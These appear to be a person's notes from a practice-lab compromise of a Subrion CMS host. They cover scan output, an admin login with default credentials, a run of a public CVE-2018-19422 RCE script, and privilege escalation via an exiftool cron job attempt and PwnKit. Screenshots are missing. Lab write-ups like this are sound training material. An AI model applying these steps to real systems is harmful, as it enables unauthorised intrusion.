linux ttl=61

# curl redirection

```
curl -v http://exfiltrated.offsec
```

![[Pasted image 20240615120432.png]]
# rustscan

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

# nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home :: Powered by Subrion 4.2
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-generator: Subrion CMS - Open Source Content Management System
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|firewall|WAP
Running (JUST GUESSING): Linux 2.6.X|4.X|5.X|3.X|2.4.X (87%), Synology DiskStation Manager 5.X (86%), WatchGuard Fireware 11.X (86%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:watchguard:fireware:11.8 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (86%), Linux 2.6.32 or 3.10 (86%), Linux 2.6.39 (86%), Linux 3.10 - 3.12 (86%), Linux 3.4 (86%), Linux 3.5 (86%), Linux 3.7 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# initial

got ports only and got `/panel` from dirbuster which have admin login

### default creds

`admin:admin`

![[Pasted image 20240615120845.png]]
### exploit

https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

```
python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/
```

![[Pasted image 20240615121117.png]]

# priv esc

got cronjob with `image-exif.sh`

![[Pasted image 20240615123320.png]]

https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/

ideally steps showed here in Manual exploitation should work but didn't worked in my case

![[Pasted image 20240615123421.png]]

### pkexec SUID

it was SUID so just PwnKit

![[Pasted image 20240615123619.png]]